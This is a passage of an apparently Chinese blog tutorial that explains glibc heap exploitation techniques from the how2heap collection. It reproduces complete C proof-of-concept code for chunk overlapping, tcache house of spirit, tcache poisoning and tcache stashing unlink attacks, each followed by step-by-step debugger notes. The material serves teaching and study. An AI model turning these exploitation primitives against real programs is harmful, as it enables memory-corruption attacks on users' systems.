VULNERABILITY */</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(p2);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span></span><br><span class="line">               <span class="string">&quot;size of the chunk p2 injected size\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This malloc will be served from the previously freed chunk that\n&quot;</span></span><br><span class="line">               <span class="string">&quot;is parked in the unsorted bin which size has been modified by us\n&quot;</span>);</span><br><span class="line">        p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x580</span><span class="number">-8</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line">                   <span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s run through an example. Right now, we have:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);</span><br><span class="line">        <span class="built_in">memset</span>(p4, <span class="string">&#x27;4&#x27;</span>, evil_region_size);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">        assert(<span class="built_in">strstr</span>((<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p3));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调试-2"><a href="#调试-2" class="headerlink" title="调试"></a>调试</h3><p>37 行，创建了 3 个 chunk ，并填满数据</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639120198739453/b04447dbeb27a7d251219da667a380964a5163b9.png" alt="image-20211210150958466"></p><p>47 行，把 chunk 2 的 size 改为 0x581</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639120569838043/bdd14c011007eb10954d50253625c8f5e991aa2c.png" alt="image-20211210151609597"></p><p>50 行，将 chunk 2 free 掉，因为 size 被改成了 0x581(0x500+0x80)，chunk 2 将 chunk 3 “吞并”，并和 topchunk 合并 </p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639120803311021/b95fde300e6ce54e1256c1a6e5590f4be67ea1ee.png" alt="image-20211210152003150"></p><p>57 行，再次申请一个 0x578 大小的 chunk，此时 bin 中是空的，所以直接从 topchunk 中分出一部分</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639121397156227/e5fcaace399e90ebf973f5d2796800136483fe48.png" alt="image-20211210152956922"></p><p>chunk 3 仍然存在，chunk 4 包含了 chunk3 ，因此我们可以通过 chunk 4 改到 chunk 3 的内容</p><hr><p>前提是堆溢出</p><p>和在 unsortedbin 中 伪造堆块达到 uaf 的效果很像，只是这一次是在 top chunk 中进行</p><h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h2><p>简单来说就是<strong>释放一个不属于堆段的伪造堆块，然后重新申请</strong></p><h3 id="源码-3"><a href="#源码-3" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -g tcache_house_of_spirit.c -o tcache_house_of_spirit</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the house of spirit attack on tcache.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;It works in a similar way to original house of spirit but you don&#x27;t need to create fake chunk after the fake chunk that will be freed.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#x27;s size and prev_inuse are sane.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free     for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 w    ill all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">        fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">        assert((<span class="keyword">long</span>)b == (<span class="keyword">long</span>)&amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调试-3"><a href="#调试-3" class="headerlink" title="调试"></a>调试</h3><p>20 行，创建一个堆块进行 malloc 函数的初始化</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639137267269969/787a795acd8c62a5febeeb8dade891f6b7c86671.png" alt="image-20211210195427076"></p><p>36 行，伪造了一个数组 fake_chunks，并将其 ‘size’ 位 设置成 0x40</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639137398970495/ecb9fe4453634f06bce560dd42cfc3ce5a2320c3.png" alt="image-20211210195638799"></p><p>39 行，把这个 fake_chunks free 掉</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639137445849418/932675325d138bc39ff92c5eaa98e2948a077ac1.png" alt="image-20211210195725669"></p><p>43 行，再次申请 0x30 大小的 chunk ，从 tcachebin 中取出 fake_chunks，并能够对其操作</p><h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h2><p>源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="comment">// disable buffering</span></span><br><span class="line">        setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">        setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a simple tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;The attack is very similar to fastbin corruption attack.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">size_t</span> stack_var;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The address we want malloc() to return is %p.\n&quot;</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocating 2 buffers.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, a);</span><br><span class="line">        <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc(128): %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Freeing the buffers...\n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line">        <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;to point to the location to control (%p).\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>), b, &amp;stack_var);</span><br><span class="line">        b[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p ].\n&quot;</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;2nd malloc(128): %p\n&quot;</span>, c);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;We got the control\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        assert((<span class="keyword">long</span>)&amp;stack_var == (<span class="keyword">long</span>)c);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调试-4"><a href="#调试-4" class="headerlink" title="调试"></a>调试</h3><p>30 行，创建两个 chunk 并将其 free，链入 tcachebin</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639138212747889/e894736baf3da1d4531962ff873e3850a27bd922.png" alt="image-20211210201012568"></p><p>36 行，将 330 的 chunk 的 fd 改为 stack_var，stack_var 链入 tcachebin</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639138536542069/4f731c8ed58a40509f90029907c841b2aa08be18.png" alt="image-20211210201536354"></p><p>再次申请就可以申请到 stack_var 了</p><hr><p>要在 chunk 被 free 后改到 fd ，说明要能对 chunk 进行 写 操作，并且 chunk 本身指针没有被清空</p><h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h2><h3 id="源码-4"><a href="#源码-4" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//gcc -g tcache_stashing_unlink_attack.c -o tcache_stashing_unlink_attack_231</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This poc has been tested on both glibc-2.27, glibc-2.29 and glibc-2.31.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last no    t least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.    \n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we     can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 chunks into tcache</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to a    nother will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">// size &gt; 0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk wer    e linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr    : %p\n\n&quot;</span>,(<span class="keyword">void</span>*)stack_var[<span class="number">2</span>],(<span class="keyword">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="调试-5"><a href="#调试-5" class="headerlink" title="调试"></a>调试</h3><p>首先创建了两个数组，stack_var 和 chunk_lis，stack_var 将作为 fake_chunk 使用，chunk_lis 中会存放创建的堆块的 malloc 指针</p><p>24 行，将 stack_var[3] 的位置写上了 stack_var[2] 的地址，这里是为了后续将fake_chunk的bk指针指向一块可写的内存，绕过glibc在摘链表时候的检查</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639140215146820/3884a53f294de2d01114062e6109969294165164.png" alt="image-20211210204334973"></p><p>42 行，申请了 9 个 chunk ，并将 chunk_3 ~ chunk_8 free 放入 tcachebin</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639140336977544/58a7a38a3837f8f3b2741e685768ffc081a01c21.png" alt="image-20211210204536762"></p><p>48 行，依次 free 掉 chunk_1 、chunk_0 、chunk_2，注意下释放的顺序，因为 chunk_0 和 chunk_2 在物理地址上不相邻，所以放入 unsortedbin 时不会合并</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639140507778734/380c18274d80409277cdd41166446ed5dbcfb054.png" alt="image-20211210204827593"></p><p>53 行，申请一个 0xb0 ( data 部分为 0xa0 )大小的堆块，由于遍历 tcache bin 后没有合适的大小的堆块，所以会接着遍历 unsorted bin，由于 chunk_0 与 chunk _2 地址不相邻，所以无法合并成大堆块进行拆分，所以最后会从 top_chunk 中新申请一个 0xb0 ( data 部分为 0xa0 )大小的堆块，并且将 unsorted bin 中的两个堆块，按照大小排列在 small bin 中 </p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639140847766685/d03c26cca20d59a3288f620bf8b8cea43f1f029e.png" alt="image-20211210205407533"></p><p>59 行，申请两个 0x90 大小的 chunk ，从 tcachebin 中拿出之前 free 掉的 chunk_1 和 chunk_8</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/how2heap/1639141773724915/f3ce38cea03a2e830cea38d8c50108201717b938.png" alt="image-20211210210933546"></p><p>66 行，将 chunk_2 的 bk 